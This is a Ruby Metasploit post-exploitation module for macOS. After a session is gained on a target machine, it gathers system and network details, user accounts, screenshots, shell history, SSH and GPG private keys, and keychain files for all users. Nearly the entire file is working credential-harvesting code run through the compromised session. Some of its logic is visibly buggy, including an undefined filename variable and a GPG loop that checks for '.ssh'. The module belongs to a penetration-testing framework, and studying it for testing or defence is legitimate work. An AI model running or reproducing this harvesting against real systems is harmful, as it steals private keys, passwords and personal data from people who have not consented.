##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Gather Mac OS X System Information Enumeration',
        'Description'   => %q{
            This module gathers basic system information from Mac OS X Tiger, Leopard,
          Snow Leopard and Lion systems.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ "meterpreter", "shell" ]
      ))

  end

  # Run Method for when run command is issued
  def run
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname")
    end
    print_status("Running module against #{host}")
    if is_root?
      print_status("This session is running as root!")
    end

    ver_num = get_ver
    log_folder = log_folder_create
    enum_conf(log_folder)
    enum_accounts(log_folder, ver_num)
    get_crypto_keys(log_folder)
    screenshot(log_folder, ver_num)
    dump_bash_history(log_folder)
    get_keychains(log_folder)
  end

  #parse the dslocal plist in lion
  def read_ds_xml_plist(plist_content)
    require "rexml/document"

    doc  = REXML::Document.new(plist_content)
    keys = []

    doc.elements.each("plist/dict/key") do |element|
      keys << element.text
    end

    fields = {}
    i = 0
    doc.elements.each("plist/dict/array") do |element|
      data = []
      fields[keys[i]] = data
      element.each_element("*") do |thing|
        data_set = thing.text
        if data_set
          data << data_set.gsub("\n\t\t","")
        else
          data << data_set
        end
      end
      i+=1
    end
    return fields
  end

  # Function for creating the folder for gathered data
  def log_folder_create(log_path = nil)
    #Get hostname
    case session.type
    when /meterpreter/
      host = Rex::FileUtils.clean_path(sysinfo['Computer'])
    when /shell/
      host = Rex::FileUtils.clean_path(cmd_exec('hostname'))
    end

    # Create Filename info to be appended to downloaded files
    file_name_info = '_' + ::Time.now.strftime('%Y%m%d.%M%S')

    # Create a directory for the logs
    if log_path
      logs = ::File.join(log_path, 'logs', 'enum_osx', host + file_name_info )
    else
      logs = ::File.join(Msf::Config.log_directory, 'post', 'enum_osx', host + file_name_info )
    end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)
    return logs
  end

  # Checks if the target is OSX Server
  def check_server
    # Get the OS Name
    cmd_exec("/usr/bin/sw_vers", "-productName") =~/Server/
  end

  # Enumerate the OS Version
  def get_ver
    # Get the OS Version
    cmd_exec('/usr/bin/sw_vers', '-productVersion')
  end

  def enum_conf(log_folder)
    profile_datatypes = {
      'OS' => 'SPSoftwareDataType',
      'Network' => 'SPNetworkDataType',
      'Bluetooth' => 'SPBluetoothDataType',
      'Ethernet' => 'SPEthernetDataType',
      'Printers' => 'SPPrintersDataType',
      'USB' => 'SPUSBDataType',
      'Airport' => 'SPAirPortDataType',
      'Firewall' => 'SPFirewallDataType',
      'Known Networks' => 'SPNetworkLocationDataType',
      'Applications' => 'SPApplicationsDataType',
      'Development Tools' => 'SPDeveloperToolsDataType',
      'Frameworks' => 'SPFrameworksDataType',
      'Logs' => 'SPLogsDataType',
      'Preference Panes' => 'SPPrefPaneDataType',
      'StartUp' => 'SPStartupItemDataType'
    }

    shell_commands = {
      'TCP Connections' => ['/usr/sbin/netstat', '-np tcp'],
      'UDP Connections' => ['/usr/sbin/netstat', '-np udp'],
      'Environment Variables' => ['/usr/bin/printenv', ''],
      'Last Boottime' => ['/usr/bin/who', '-b'],
      'Current Activity' => ['/usr/bin/who', ''],
      'Process List' => ['/bin/ps', '-ea']
    }

    print_status("Saving all data to #{log_folder}")

    # Enumerate first using System Profiler
    profile_datatypes.each do |name, profile_datatypes|
      print_status("\tEnumerating #{name}")
      returned_data = cmd_exec("/usr/sbin/system_profiler #{profile_datatypes}")
      # Save data lo log folder
      file_local_write(log_folder+"//#{name}.txt", returned_data)
    end

    # Enumerate using system commands
    shell_commands.each do |name, command|
      print_status("\tEnumerating #{name}")
      command_output = cmd_exec(command[0],command[1])
      # Save data lo log folder
      begin
        file_local_write(log_folder+"//#{name}.txt",command_output)
      rescue
        print_error("failed to run #{name}")
      end
    end
  end

  def enum_accounts(log_folder,ver_num)
    # Specific commands for Leopard and Snow Leopard
    leopard_commands = {
      'Users' => ['/usr/bin/dscacheutil', '-q user'],
      'Groups' => ['/usr/bin/dscacheutil', '-q group']
    }

    # Specific commands for Tiger
    tiger_commands = {
      'Users' => ['/usr/sbin/lookupd', '-q user'],
      'Groups' => ['/usr/sbin/lookupd', '-q group']
    }

    if ver_num =~ /10\.(7|6|5)/
      shell_commands = leopard_commands
    else
      shell_commands = tiger_commands
    end
    shell_commands.each do |name, command|
      print_status("\tEnumerating #{name}")
      command_output = cmd_exec(command[0], command[1])
      # Save data lo log folder
      file_local_write(log_folder+"//#{name}.txt", command_output)
    end
  end


  # Method for getting SSH and GPG Keys
  def get_crypto_keys(log_folder)
    # Run commands according to the session type
    if session.type =~ /shell/

      # Enumerate and retreave files according to privilege level
      if not is_root?

        # Enumerate the home folder content
        home_folder_list = cmd_exec("/bin/ls -ma ~/").split(", ")

        # Check for SSH folder and extract keys if found
        if home_folder_list.include?("\.ssh")
          print_status(".ssh Folder is present")
          ssh_folder = cmd_exec("/bin/ls -ma ~/.ssh").split(", ")
          ssh_folder.each do |k|
            next if k =~/^\.$|^\.\.$/
            print_status("\tDownloading #{k.strip}")
            ssh_file_content = cmd_exec("/bin/cat ~/.ssh/#{k}")

            # Save data lo log folder
            file_local_write(log_folder+"//#{name}",ssh_file_content)
          end
        end

        # Check for GPG and extract keys if found
        if home_folder_list.include?("\.gnupg")
          print_status(".gnupg Folder is present")
          gnugpg_folder = cmd_exec("/bin/ls -ma ~/.gnupg").split(", ")
          gnugpg_folder.each do |k|
            next if k =~/^\.$|^\.\.$/
            print_status("\tDownloading #{k.strip}")
            gpg_file_content = cmd_exec("/bin/cat ~/.gnupg/#{k.strip}")

            # Save data lo log folder
            file_local_write(log_folder+"//#{name}", gpg_file_content)
          end
        end
      else
        users = []
        users_folder = cmd_exec("/bin/ls","/Users")
        users_folder.each_line do |u|
          next if u.chomp =~ /Shared|\.localized/
          users << u.chomp
        end

        users.each do |u|
          user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(", ")
          if user_folder.include?("\.ssh")
            print_status(".ssh Folder is present for #{u}")
            ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.ssh").split(", ")
            ssh_folder.each do |k|
              next if k =~/^\.$|^\.\.$/
              print_status("\tDownloading #{k.strip}")
              ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")

              # Save data lo log folder
              file_local_write(log_folder+"//#{name}",ssh_file_content)
            end
          end
        end


        users.each do |u|
          user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(", ")
          if user_folder.include?("\.ssh")
            print_status(".gnupg Folder is present for #{u}")
            ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.gnupg").split(", ")
            ssh_folder.each do |k|
              next if k =~/^\.$|^\.\.$/
              print_status("\tDownloading #{k.strip}")
              ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")

              # Save data lo log folder
              file_local_write(log_folder+"//#{name}",ssh_file_content)
            end
          end
        end
      end
    end
  end

  # Method  for capturing screenshot of targets
  def screenshot(log_folder, ver_num)
    if ver_num =~ /10\.(7|6|5)/
      print_status("Capturing screenshot")
      picture_name = ::Time.now.strftime("%Y%m%d.%M%S")
      if is_root?
        print_status("Capturing screenshot for each loginwindow process since privilege is root")
        if session.type =~ /shell/
          loginwindow_pids = cmd_exec("/bin/ps aux \| /usr/bin/awk \'/name/ \&\& \!/awk/ \{print \$2\}\'").split("\n")
          loginwindow_pids.each do |pid|
            print_status("\tCapturing for PID:#{pid}")
            cmd_exec("/bin/launchctl bsexec #{pid} /usr/sbin/screencapture -x /tmp/#{pid}.jpg")
            file_local_write(log_folder + "//screenshot_#{pid}.jpg",
                             cmd_exec("/bin/cat /tmp/#{pid}.jpg"))
            cmd_exec("/usr/bin/srm -m -z /tmp/#{pid}.jpg")
          end
        end
      else
        cmd_exec("/usr/sbin/screencapture", "-x /tmp/#{picture_name}.jpg")
        file_local_write(log_folder+"//screenshot.jpg",
                         cmd_exec("/bin/cat /tmp/#{picture_name}.jpg"))
        cmd_exec("/usr/bin/srm", "-m -z /tmp/#{picture_name}.jpg")
      end
      print_status("Screenshot Captured")
    end
  end

  def dump_bash_history(log_folder)
    print_status("Extracting history files")
    users = []
    users_folder = cmd_exec("/bin/ls","/Users")
    current_user = cmd_exec("/usr/bin/id","-nu")
    users_folder.each_line do |u|
      next if u.chomp =~ /Shared|\.localized/
      users << u.chomp
    end

    # If we are root lets get root for when sudo was used and all users
    if current_user == "root"

      # Check the root user folder
      root_folder = cmd_exec("/bin/ls -ma ~/").split(", ")
      root_folder.each do |f|
        if f =~ /\.\w*\_history/
          print_status("\tHistory file #{f.strip} found for root")
          print_status("\tDownloading #{f.strip}")
          sh_file = cmd_exec("/bin/cat ~/#{f.strip}")

          # Save data lo log folder
          file_local_write(log_folder+"//root_#{f.strip}.txt",sh_file)
        end
      end

      # Getting the history files for all users
      users.each do |u|

        # Lets get a list of all the files on the users folder and place them in an array
        user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(", ")
        user_folder.each do |f|
          if f =~ /\.\w*\_history/
            print_status("\tHistory file #{f.strip} found for #{u}")
            print_status("\tDownloading #{f.strip}")
            sh_file = cmd_exec("/bin/cat /Users/#{u}/#{f.strip}")

            # Save data lo log folder
            file_local_write(log_folder+"//#{u}_#{f.strip}.txt",sh_file)
          end
        end
      end

    else
      current_user_folder = cmd_exec("/bin/ls -ma ~/").split(", ")
      current_user_folder.each do |f|
        if f =~ /\.\w*\_history/
          print_status("\tHistory file #{f.strip} found for #{current_user}")
          print_status("\tDownloading #{f.strip}")
          sh_file = cmd_exec("/bin/cat ~/#{f.strip}")

          # Save data lo log folder
          file_local_write(log_folder+"//#{current_user}_#{f.strip}.txt",sh_file)
        end
      end
    end
  end

  # Download configured Keychains
  def get_keychains(log_folder)
    users = []
    users_folder = cmd_exec("/bin/ls","/Users")
    users_folder.each_line do |u|
      next if u.chomp =~ /Shared|\.localized/
      users << u.chomp
    end
    if is_root?
      users.each do |u|
        print_status("Enumerating and Downloading keychains for #{u}")
        keychain_files = cmd_exec("/usr/bin/sudo -u #{u} -i /usr/bin/security list-keychains").split("\n")
        keychain_files.each do |k|

          keychain_file = cmd_exec("/bin/cat #{k.strip}")

          # Save data lo log folder
          file_local_write(log_folder+"//#{u}#{k.strip.gsub(/\W/,"_")}",keychain_file)
        end
      end
    else
      current_user = cmd_exec("/usr/bin/id -nu")
      print_status("Enumerating and Downloading keychains for #{current_user}")
      keychain_files = cmd_exec("usr/bin/security list-keychains").split("\n")
      keychain_files.each do |k|

        keychain_file = cmd_exec("/bin/cat #{k.strip}")

        # Save data lo log folder
        file_local_write(log_folder+"//#{current_user}#{k.strip.gsub(/\W/,"_")}",keychain_file)
      end
    end
  end
end
